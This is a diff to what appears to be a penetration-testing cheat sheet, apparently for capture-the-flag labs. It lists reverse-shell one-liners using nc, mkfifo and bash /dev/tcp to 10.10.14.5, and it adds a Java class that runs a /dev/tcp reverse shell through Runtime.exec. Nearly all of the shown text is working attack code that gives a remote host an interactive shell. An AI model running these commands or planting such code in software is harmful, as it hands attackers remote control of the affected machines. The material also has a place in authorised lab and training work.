@@ -109,6 +109,7 @@ sudo tcpdump ip proto \\icmp -i tun0
 ```
 ## Reverse shells
 
+### Shell
 ```sh
 # Works most of the time, useful when nc has no -e option
 /bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 8621 >/tmp/f
@@ -116,6 +117,22 @@ sudo tcpdump ip proto \\icmp -i tun0
 nc -e /bin/sh 10.10.14.5 8621
 # Try it, depends on bash
 bash -c "bash -i >& /dev/tcp/10.10.14.5/8621 0>&1"
+```
+### Java
+
+```java
+public class RuntimeDemo {
+
+   public static void main(String[] args) {
+      try {
+
+         String[] cmdArray = {"/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.5/8622;cat <&5 | while read line; do $line 2>&5 >&5; done"};
+         Process process = Runtime.getRuntime().exec(cmdArray,null);
+      } catch (Exception ex) {
+         ex.printStackTrace();
+      }
+   }
+}
 ```
 
 ## Socat
